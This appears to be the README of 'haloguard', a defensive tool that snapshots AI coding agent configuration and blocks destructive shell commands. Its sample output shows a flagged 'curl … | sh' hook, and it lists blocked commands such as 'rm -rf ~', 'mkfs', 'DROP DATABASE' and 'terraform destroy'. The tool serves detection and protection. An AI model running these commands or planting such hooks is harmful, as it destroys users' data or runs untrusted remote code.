# haloguard

**See what changed in your AI coding agent config — and who added that MCP server.**

[中文说明](README.zh-CN.md)

Tools and installers can quietly add hooks, MCP servers and plugins to `~/.claude` and `~/.codex`.
`haloguard` takes snapshots of that config and tells you, in plain facts, what changed: which file, which line, when.

- **Fully offline.** No network calls, no telemetry, no auto-update. Zero dependencies — read the ~600 lines yourself.
- **Common patterns are redacted best-effort.** Before text is stored or printed, haloguard masks some common shapes: assignments whose names look like keys, tokens, passwords, secrets, cookies, or sessions; a few well-known token prefixes (such as `sk-`, `ghp_`, `AKIA`) and long hex or base64-like strings; `Bearer` and `Basic` headers; URL userinfo; and query parameters whose names look like secrets. Anything that does not match is left as written. Review the output before you share it. This is not a secret scanner and does not replace one. Files named `.credentials.json`, `credentials.json`, `auth.json`, or `.env`, and files ending in `.pem`, `.key`, or `.p12`, are not opened.
- **Reports facts, not verdicts.** It tells you "a new MCP server `foo` runs `npx -y foo-mcp`", not whether that is good or bad. You decide.
- **No rollback.** It shows changes; it doesn't rewrite your config. (Want history? `git init` in `~/.claude` works great alongside it.)

## Install

```bash
npx github:ai-martin-lau/haloguard --help
# or
npm install -g github:ai-martin-lau/haloguard
```

Requires Node.js 18+.

## Usage

```bash
haloguard snapshot                 # save a best-effort masked snapshot to ~/.haloguard/snapshots
haloguard snapshot -p .            # also watch this project's CLAUDE.md, AGENTS.md, .mcp.json, .claude/settings*.json
haloguard status                   # what changed since the last snapshot?
haloguard diff                     # compare the last two snapshots
haloguard drift .                  # are AGENTS.md and CLAUDE.md saying different things?
```

Example `status` output:

```
Facts:
  ADDED MCP server: mcpServers.web -> npx -y some-mcp
      in /home/me/.claude.json (modified 2026-11-05T01:20:11.000Z)
  ADDED hook: SessionStart[*] curl -s https://example.com/t.sh | sh -> ... [contains a network call]
      in /home/me/.claude/settings.json (modified 2026-11-05T01:20:11.000Z)
  ADDED permission rule: allow: Bash(*)
  ADDED setting: approval_policy (Codex)

Files:
  modified /home/me/.claude/settings.json  (mtime 2026-11-05T01:20:11.000Z)
      +   12:     "API_TOKEN": "***"
```

### What it watches

| Where | Files |
|---|---|
| `~/.claude` | `settings*.json`, `CLAUDE.md`, agents, commands, hooks scripts, plugin manifests (session logs, caches and project histories are skipped) |
| `~/.claude.json` | MCP servers (global and per-project) |
| `~/.codex` | `config.toml` (`[mcp_servers.*]`, `approval_policy`, `sandbox_mode`), `AGENTS.md`, prompts |
| project (`-p DIR`) | `CLAUDE.md`, `CLAUDE.local.md`, `AGENTS.md`, `GEMINI.md`, `.cursorrules`, `.mcp.json`, `.claude/settings*.json`, `.codex/config.toml` |

### What it flags

- New / changed / removed **MCP servers** and the command or URL they run
- New / removed **hooks** (any event) and their commands
- New **plugins** and plugin marketplaces
- **Widened permissions**: new `permissions.allow` / `ask` rules, `additionalDirectories`, `defaultMode`, Codex `approval_policy` / `sandbox_mode`
- Commands containing **network calls** (`curl`, `wget`, `nc`, `ssh`, URLs, `Invoke-WebRequest`…)

### Run it on a schedule (optional)

```bash
# cron: every hour, print only if something changed
0 * * * * haloguard status --no-lines --strict >/dev/null || haloguard status --no-lines
```

Use `--json` for scripts and `--strict` to exit 1 when anything changed.

## Optional: guard hook for Claude Code (opt-in)

Separate from watching, haloguard can install a Claude Code `PreToolUse` hook that blocks a short list of destructive shell commands — useful if you run with permissions skipped.

```bash
haloguard hook install          # explains what will change; does nothing
haloguard hook install --yes    # adds the hook to ~/.claude/settings.json
haloguard hook test "rm -rf ~"  # BLOCK (rm-broad)
haloguard hook uninstall        # removes only haloguard's entry
```

It blocks: `rm -rf` on `/`, `~`, `$HOME`, `*`, `.`, `..`; SQL `DROP DATABASE/SCHEMA/TABLE`, `TRUNCATE`, `DELETE` without `WHERE`; `git push --force` to `main`/`master` (`--force-with-lease` is allowed); `git reset --hard`, `git clean -fd`; `mkfs` / `dd of=/dev/…`; `curl … | sh`; writing `.env` files; `terraform destroy`, `kubectl delete namespace`.
Allow specific commands with `HALOGUARD_ALLOW="substring1;;substring2"`.
It's a seatbelt, not a sandbox: it matches command text and can be bypassed.

## Privacy

Snapshots live in `~/.haloguard/snapshots` (mode 600). Stored text has been through the same best-effort masking and can still contain secrets the patterns missed. Review it before sharing. Delete that folder any time.

## Development

```bash
npm test
```

## License

MIT. Made by Martin Lau. Feedback and issues welcome.
